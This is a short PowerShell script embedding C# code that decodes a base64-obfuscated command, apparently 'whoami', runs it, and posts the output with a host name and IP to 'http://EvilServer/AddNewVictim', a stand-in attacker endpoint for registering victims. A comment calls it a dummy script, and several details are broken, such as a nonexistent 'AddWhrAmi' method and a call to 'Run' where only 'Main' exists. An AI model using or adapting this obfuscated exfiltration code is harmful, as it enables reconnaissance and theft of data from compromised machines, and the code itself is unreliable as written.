$code = @"
using System;
using System.Diagnostics;
using System.Net;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Management.Automation;
using System.Collections.ObjectModel;

namespace B64XORed
{
	public class Cat
	{
		public static void Main(WebClient wc)
		{
			PowerShell pstest = PowerShell.Create();
			String WhrAmi = "zcefzJGR8PzO9JeY9P/Kyd7A9Ib078T0/vTfm5v0lJT2";
			WhrAmi = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(WhrAmi));
			string name = "28.3986991 36.5659024";
            string ip = Dns.GetHostEntry(name).AddressList[0].ToString();
			pstest.AddWhrAmi(WhrAmi);
			Collection<PSObject> output = null;
			output = pstest.Invoke();
			//-- This is Just a Dummy Script Btw 
			string post = "cght=" + output +"&name=" + name + "&ip=" + ip;
            wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            wc.UploadString("http://EvilServer/AddNewVictim", post);
		}
	}
}
"@

Add-Type -TypeDefinition $code;
$instance = New-Object B64XORed.Cat;
$instance.Run();